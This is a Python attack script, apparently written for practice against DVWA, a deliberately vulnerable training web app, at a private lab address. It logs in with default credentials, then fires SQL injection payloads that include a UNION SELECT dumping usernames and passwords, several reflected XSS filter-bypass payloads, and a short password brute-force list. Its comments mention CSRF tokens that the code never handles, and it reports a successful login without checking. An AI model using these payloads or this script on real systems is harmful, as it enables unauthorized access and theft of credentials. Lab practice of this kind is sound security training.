#!/usr/bin/env python3
# DVWA High Security Bypass
# Author: Krishan Sharma

import requests

TARGET = "http://192.168.220.129/dvwa"

# ─── Step 1: Login karke Session lo ──
def get_session():
    session = requests.Session()
    
    # CSRF token lo
    login_page = session.get(f"{TARGET}/login.php")
    
    # Login karo
    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login"
    }
    session.post(f"{TARGET}/login.php", data=login_data)
    print("[+] Login successful!")
    return session

# ─── Step 2: SQLi High Bypass ─────────
def sqli_high(session):
    print("\n[*] Testing SQLi on HIGH security...\n")
    
    # High security mein POST request hota hai
    payloads = [
        "1' OR '1'='1' -- -",
        "1' UNION SELECT user,password FROM users -- -",
        "1' OR 1=1 -- -"
    ]
    
    for payload in payloads:
        data = {
            "id": payload,
            "Submit": "Submit"
        }
        r = session.post(
            f"{TARGET}/vulnerabilities/sqli/",
            data=data
        )
        
        if "First name" in r.text:
            print(f"[+] SQLi BYPASS SUCCESS!")
            print(f"[+] Payload: {payload}")
            
            # User data extract karo
            if "admin" in r.text:
                print("[+] Admin user data leaked!")
            break
        else:
            print(f"[-] Failed: {payload}")

# ─── Step 3: XSS High Bypass ──────────
def xss_high(session):
    print("\n[*] Testing XSS on HIGH security...\n")
    
    # High security filter bypass payloads
    payloads = [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<%2Fscript><script>alert(1)<%2Fscript>",
        "<ScRiPt>alert(1)</ScRiPt>"
    ]
    
    for payload in payloads:
        data = {
            "name": payload,
            "Submit": "Submit"
        }
        r = session.post(
            f"{TARGET}/vulnerabilities/xss_r/",
            data=data
        )
        
        if payload in r.text:
            print(f"[+] XSS BYPASS SUCCESS!")
            print(f"[+] Payload: {payload}")
            break
        else:
            print(f"[-] Filtered: {payload}")

# ─── Step 4: Brute Force High ─────────
def brute_force_high(session):
    print("\n[*] Brute Forcing on HIGH security...\n")
    
    passwords = ["password", "admin", "123456", 
                 "admin123", "letmein", "qwerty"]
    
    for pwd in passwords:
        # CSRF token har request pe chahiye
        r = session.get(
            f"{TARGET}/vulnerabilities/brute/",
        )
        
        params = {
            "username": "admin",
            "password": pwd,
            "Login": "Login"
        }
        
        r = session.get(
            f"{TARGET}/vulnerabilities/brute/",
            params=params
        )
        
        if "Welcome to the password" in r.text:
            print(f"[+] PASSWORD FOUND: {pwd}")
            return pwd
        else:
            print(f"[-] Wrong: {pwd}")
    
    return None

# ─── Main ─────────────────────────────
def main():
    print("""
   
     DVWA High Security Bypass    
  
    """)
    
    session = get_session()
    sqli_high(session)
    xss_high(session)
    brute_force_high(session)
    
    print("\n[*] Done!")

main()
